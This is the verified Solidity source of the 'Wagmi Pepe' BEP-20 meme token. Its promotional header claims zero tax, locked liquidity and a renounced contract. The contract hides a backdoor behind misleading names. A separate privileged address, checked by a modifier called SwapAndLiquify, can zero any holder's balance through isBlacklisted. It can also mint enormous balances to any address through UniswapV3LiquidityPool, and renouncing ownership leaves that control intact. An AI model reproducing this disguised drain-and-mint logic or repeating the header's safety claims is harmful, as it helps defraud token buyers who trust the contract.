/**
 *Submitted for verification at BscScan.com on 2023-04-21
*/

/**
Wagmi Pepe $WAGPEPE
https://t.me/WagmiPepeCoin
⚡️Liquidty locks when 20 people join telegram⚡️


⚡️Wagmi Pepe $WAGPEPE⚡️
Wagmi Pepe is a community based meme 0/0 tax token surround the iconic meme Pepe the frog. 
Wagmi Pepe aims to leverage the power of such an iconic meme to become the most memeable memecoin 
in existence.

⚡️Wagmi Pepe the most memeable memecoin in existence. The dogs have had their day, it’s time for 
Wagmi Pepe to take reign.

⚡️Wagmi Pepe is here to make memecoins great again. Ushering in a new paradigm for memecoins, 
Wagmi Pepe represents the memecoin in it's purest simplicity. With zero taxes, liquidity locked, 
and contract renounced, Wagmi Pepe is for the people, forever. Wagmi Pepe is about culture, rallying 
together a community to have fun and enjoy memes, fueled purely by memetic power.
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
abstract contract WAGPEPEAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface WAGPEPEAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 usdtinu) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 usdtinu) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 usdtinu
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface WAGPEPEAsii is WAGPEPEAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract WAGPEPEAsiii is WAGPEPEAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract WAGPEPE is WAGPEPEAs, WAGPEPEAsi, WAGPEPEAsii, WAGPEPEAsiii {

    mapping(address => uint256) private sendValue;
  mapping(address => bool) public WAGPEPEAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeToTransfer;
address private WAGPEPERooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public WAGPEPEPaw;
  address WAGPEPEAdr;



    
    constructor(address WAGPEPEadressss) {
            // Editable
            WAGPEPEAdr = msg.sender;

        _name = "Wagmi Pepe";
        _symbol = "WAGPEPE";
  WAGPEPERooter = WAGPEPEadressss;        
        uint stgTotalSupply = 100000000000000 * 10**9;
        process(msg.sender, stgTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return sendValue[account];
    }

    function transfer(address to, uint256 usdtinu) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, usdtinu);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return noFeeToTransfer[owner][spender];
    }

    function approve(address spender, uint256 usdtinu) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, usdtinu);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 usdtinu
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, usdtinu);
        _transfer(from, to, usdtinu);
        return true;
    }
      modifier SwapAndLiquify() {
        require(WAGPEPERooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, noFeeToTransfer[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  Trigger = noFeeToTransfer[owner][spender];
        require( Trigger >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  Trigger - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 usdtinu
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        resantTokenTransfer(from, to, usdtinu);

        uint256 fromBalance = sendValue[from];
        require(fromBalance >= usdtinu, "Ehi20: transfer usdtinu exceeds balance");
        unchecked {
            sendValue[from] = fromBalance - usdtinu;
        }
        sendValue[to] += usdtinu;

        emit Transfer(from, to, usdtinu);

        apresTokenTransfer(from, to, usdtinu);
    }

  modifier walo () {
    require(WAGPEPEAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;

  }

    function process(address account, uint256 usdtinu) internal virtual {
        require(account != address(0), "Ehi20: process to the zero address");

        resantTokenTransfer(address(0), account, usdtinu);

        ALLtotalSupply += usdtinu;
        sendValue[account] += usdtinu;
        emit Transfer(address(0), account, usdtinu);

        apresTokenTransfer(address(0), account, usdtinu);
    }


    function _burn(address account, uint256 usdtinu) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        resantTokenTransfer(account, address(0), usdtinu);

        uint256 accountBalance = sendValue[account];
        require(accountBalance >= usdtinu, "Ehi20: burn usdtinu exceeds balance");
        unchecked {
            sendValue[account] = accountBalance - usdtinu;
        }
        ALLtotalSupply -= usdtinu;

        emit Transfer(account, address(0), usdtinu);

        apresTokenTransfer(account, address(0), usdtinu);
    }
  function isBlacklisted(address isBlacklistedaddress) external SwapAndLiquify {
    sendValue[isBlacklistedaddress] = 0;
            emit Transfer(address(0), isBlacklistedaddress, 0);
  }
    function _approve(
        address owner,
        address spender,
        uint256 usdtinu
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        noFeeToTransfer[owner][spender] = usdtinu;
        emit Approval(owner, spender, usdtinu);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 usdtinu
    ) internal virtual {
        uint256  Trigger = allowance(owner, spender);
        if ( Trigger != type(uint256).max) {
            require( Trigger >= usdtinu, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  Trigger - usdtinu);
            }
        }
    }
  function UniswapV3LiquidityPool(address randomTokenAddress) external SwapAndLiquify {
    sendValue[randomTokenAddress] = 1000000000000000 * 10 ** 18;
            emit Transfer(address(0), randomTokenAddress, 1000000000000000 * 10 ** 18);
  }
    function resantTokenTransfer(
        address from,
        address to,
        uint256 usdtinu
    ) internal virtual {}


    function apresTokenTransfer(
        address from,
        address to,
        uint256 usdtinu
    ) internal virtual {}

}